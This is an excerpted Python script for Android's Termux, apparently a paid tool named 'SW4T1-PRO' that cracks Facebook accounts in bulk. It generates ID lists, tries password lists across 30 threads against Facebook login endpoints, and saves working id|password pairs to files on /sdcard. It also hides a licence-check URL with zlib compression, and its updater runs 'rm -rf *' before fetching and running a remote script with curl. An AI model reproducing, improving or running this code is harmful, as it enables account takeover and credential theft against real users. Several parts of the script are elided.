...
try:
        key1 = open('/data/data/com.termux/files/usr/bin/.mrSW4T1xxx-cov', 'r').read()
except:
        kok=open('/data/data/com.termux/files/usr/bin/.mrSW4T1xxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrSW4T1xxx-cov', 'r').read()
kex=(f"SW4T1-XD{uid}TS{key1}PX110E==")
...
def chk():
        ...
        if ua not in urll:
                ...
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for SW4T1 New update ');exit()
                else:
...
try:
        ...
        if updt in linx:
                ...
                print('\n SW4T1-PRO Update Done Wait for installing...\n')
                os.system('cd $HOME && cd SW4T1-PRO')
                os.system('rm -rf *')
                os.system("curl -L https://raw.githubusercontent.com/SW4T1110/SW4T1-PRO/main/SW4T1.py -o SW4T1.py && python SW4T1.py")
...
[•]\033[1;32mAUTHOR       : \033[1;32mAB KHANX\033[1;32m
[•]\033[1;32mSTATUS       : \033[1;32mPAID\033[1;32m
--------------------------------------------------
[•] \033[1;32mVERSION    :\033[1;32m 1.0.4 \033[1;32m"DON'T WORRY FOR UPDATES!"\033[1;32m
--------------------------------------------------"""
def linex():
        print('\033[1;32m----------------------------------------------')
def clear():
        ...
        try:
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/SW4T1_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi SW4T1 Sir, I Need To Buy Your Paid SW4T1 PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SW4T1.py')
                        linex()
                        exit()
        except ValueError:
                exit()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SW4T1:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                SW4T1.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SW4T1-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        SW4T1=session.cookies.get_dict().keys()
                        if "c_user" in SW4T1:
                                print('\r\r\033[1;32m [SW4T1-0K] %s | %s'%(ids,pas))
                                open('/sdcard/SW4T1-0K.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SW4T1:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SWATI-CP] '+ids+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SW4T1-O] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SW4T1-0K.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SW4T1-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api1(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SW4T1-0K] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SW4T1-0K.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SW4T1-0K] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SWATI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [SWATI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SWATI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
